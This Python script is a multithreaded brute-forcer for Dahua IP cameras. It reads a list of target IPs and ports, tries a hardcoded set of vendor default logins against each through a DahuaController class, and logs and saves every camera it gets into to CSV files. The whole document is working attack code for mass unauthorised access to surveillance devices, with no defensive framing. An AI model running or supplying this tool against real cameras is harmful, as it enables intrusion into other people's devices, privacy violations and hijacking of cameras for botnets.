import argparse
import sys
import time
import threading
import socket
from concurrent.futures import ThreadPoolExecutor, wait, ALL_COMPLETED
from queue import Queue
import config
import utils
from dahua import DahuaController, Status

def brute_force_host(ip, port, credentials):
    try:
        test_sock = socket.create_connection((ip, int(port)), timeout=config.DEFAULT_TIMEOUT)
        test_sock.close()
    except (socket.error, socket.timeout):
        return None

    for login, password in credentials:
        camera = None
        try:
            camera = DahuaController(ip, port, login, password)

            if camera.status == Status.SUCCESS:
                config.logger.good(f"[+] SUCCESS: {ip}:{port} -> {login}:{password} | {camera.model}")
                result = {
                    'ip': ip, 'port': port, 'login': login,
                    'password': password, 'model': camera.model
                }
                camera.close()
                return result

            elif camera.status == Status.BLOCKED:
                config.logger.warning(f"[-] BLOCKED: {ip}:{port}")
                camera.close()
                return None

        except Exception as e:
            config.logger.debug(f"Error testing {ip}:{port} with {login}: {e}")
            break

        finally:
            if camera:
                camera.close()

    return None

def main():
    parser = argparse.ArgumentParser(add_help=False)

    parser.add_argument('-f', '--file', required=True,
                        help='File containing IPs')
    parser.add_argument('-t', '--threads', type=int, default=config.DEFAULT_THREADS,
                        help=f'Number of threads (Default: {config.DEFAULT_THREADS})')
    parser.add_argument('-s', '--split', type=int, default=config.DEFAULT_SPLIT,
                        help=f'Max entries per XML file (Default: {config.DEFAULT_SPLIT})')
    if '-h' in sys.argv or '--help' in sys.argv:
        parser.print_usage()
        sys.exit(0)
    if len(sys.argv) == 1:
        parser.print_usage()
        sys.exit(1)

    args = parser.parse_args()

    config.logger.setLevel(config.logging.DEBUG)

    config.logger.info(f"Loaded targets from {args.file}...")
    targets = utils.parse_target_file(args.file)
    if not targets:
        sys.exit("[!] No valid targets found. Exiting.")

    config.logger.info(f"Loaded {len(targets)} unique targets.")

    config.logger.info("Loaded credentials...")
    credentials = [
        ('admin', 'admin'),
        ('admin', '123456'),
        ('666666', '666666'),
        ('666666', '888888'),
        ('888888', '888888'),
        ('default', 'tluafed'),
        ('111111', '111111'),
        ('admin', 'admin123'),
        ('user', 'user')
    ]
    if not credentials:
        sys.exit("[!] No credentials found. Exiting.")

    config.logger.info(f"Loaded {len(credentials)} credential pairs to test per host.")
    if args.split > 0:
        config.logger.warning(f"Splitting into {args.split} entries per file")
    else:
        config.logger.warning("Splitting disabled")

    successful_hosts = []
    config.logger.critical(f"Starting brute force with {args.threads} threads in 5 seconds...")
    time.sleep(5)
    executor = ThreadPoolExecutor(max_workers=args.threads)
    futures = [
        executor.submit(brute_force_host, ip, port, credentials)
        for ip, port in targets
    ]

    aborted = False
    try:
        done, pending = wait(futures, return_when=ALL_COMPLETED)
        for future in done:
            try:
                result = future.result()
                if result:
                    successful_hosts.append(result)
            except Exception:
                pass
        if pending:
            config.logger.warning(f"Skipping {len(pending)} hanging targets that timed out...")
    except KeyboardInterrupt:
        config.logger.critical("\n[!] User aborted. Cleaning up...")
        aborted = True
        done, _ = wait(futures, timeout=0, return_when=ALL_COMPLETED)
        for future in done:
            try:
                result = future.result()
                if result:
                    successful_hosts.append(result)
            except Exception:
                pass
    finally:
        executor.shutdown(wait=False, cancel_futures=True)

    config.logger.info("-" * 40)
    config.logger.info(f"Scan Complete. Found {len(successful_hosts)} vulnerable devices out of {len(targets)} potential targets.")

    if successful_hosts:
        utils.save_to_csv(successful_hosts, split_size=args.split)
    import os
    os._exit(0)

if __name__ == '__main__':
    main()
